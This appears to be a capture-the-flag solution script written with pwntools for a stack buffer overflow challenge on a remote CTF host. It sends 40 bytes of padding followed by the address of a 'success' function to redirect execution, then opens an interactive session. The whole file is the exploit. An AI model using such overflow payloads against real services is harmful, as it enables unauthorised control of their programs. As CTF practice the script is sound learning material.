**script:**

```python
from pwn import *

# p = process('./source')
p = remote('earn-much-money-473a8a35.dailycookie.cloud', 30996)
exe = ELF("./source")

# gdb.attach(p,gdbscript= '''
# b*main+101
# c
# '''
# )
# input()

    
payload = b'a'*40
payload += p64(exe.sym['success'] + 1)

# p.sendafter(b'Give me your name to login:\n', payload)
p.sendline(payload)

p.interactive()
```
